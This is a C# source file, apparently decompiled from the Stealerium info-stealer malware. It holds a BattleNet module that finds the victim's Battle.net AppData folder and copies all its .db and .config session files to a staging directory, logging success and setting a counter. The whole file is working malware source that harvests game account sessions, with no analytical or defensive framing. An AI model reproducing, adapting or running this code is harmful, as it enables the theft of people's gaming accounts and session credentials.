using System;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Gaming;

internal sealed class BattleNet
{
	private static readonly string Path = global::System.IO.Path.Combine(Paths.Appdata, "Battle.net");

	public static bool GetBattleNetSession(string sSavePath)
	{
		if (!Directory.Exists(Path))
		{
			return Logging.Log("BattleNET >> Session not found");
		}
		try
		{
			Directory.CreateDirectory(sSavePath);
			string[] array = new string[2] { "*.db", "*.config" };
			foreach (string searchPattern in array)
			{
				string[] files = Directory.GetFiles(Path, searchPattern, SearchOption.AllDirectories);
				foreach (string fileName in files)
				{
					try
					{
						string text = null;
						FileInfo fileInfo = new FileInfo(fileName);
						if (fileInfo.Directory != null)
						{
							text = ((fileInfo.Directory == null || !(fileInfo.Directory!.Name == "Battle.net")) ? global::System.IO.Path.Combine(sSavePath, fileInfo.Directory!.Name) : sSavePath);
						}
						if (!Directory.Exists(text) && text != null)
						{
							Directory.CreateDirectory(text);
						}
						if (text != null)
						{
							fileInfo.CopyTo(global::System.IO.Path.Combine(text, fileInfo.Name));
						}
					}
					catch (Exception ex)
					{
						return Logging.Log("BattleNET >> Failed copy file\n" + ex, ret: false);
					}
				}
			}
			Counter.BattleNet = true;
		}
		catch (Exception ex2)
		{
			return Logging.Log("BattleNET >> Error\n" + ex2, ret: false);
		}
		return true;
	}
}
